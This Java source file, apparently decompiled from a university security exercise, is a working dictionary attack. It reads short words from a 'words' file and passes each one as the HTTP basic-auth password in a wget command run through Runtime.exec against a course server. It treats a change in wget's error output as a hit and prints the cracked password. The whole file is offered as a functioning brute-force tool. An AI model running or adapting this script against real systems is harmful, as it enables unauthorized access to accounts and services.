class Dictionary {
    Dictionary() {
        super();
    }
    public static void main ( String[] a ) {
        try {
            java.io.BufferedReader a0 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( new java.io.File ( "words" ) ) );
            URLHack a1 = new URLHack();
            while ( true ) {
                String s = a0.readLine();
                if ( s == null ) {
                    break;
                }
                if ( s.length() <= 3 ) {
                    a1.m00 ( s );
                }
            }
        } catch ( java.io.IOException a2 ) {
            System.out.println ( new StringBuilder().append ( "Error: " ).append ( ( Object ) a2 ).toString() );
        }
    }
}
class URLHack {
    URLHack() {
        super();
    }
    public void m00 ( String s ) {
        try {
            String s0 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( Runtime.getRuntime().exec ( new StringBuilder().append ( "wget -nv --http-user= --http-passwd=" ).append ( s ).append ( " http://sec-crack.cs.rmit.edu./SEC/2/" ).toString() ).getErrorStream() ) ).readLine();
            System.out.println ( s0 );
            if ( s0.length() != 21 ) {
                System.out.println ( new StringBuilder().append ( "Password is " ).append ( s ).toString() );
                System.exit ( 0 );
            } else {
                System.out.println ( new StringBuilder().append ( "Invalid Password " ).append ( s ).toString() );
            }
        } catch ( Exception a ) {
            System.out.println ( new StringBuilder().append ( " ERROR " ).append ( ( Object ) a ).toString() );
        }
    }
}
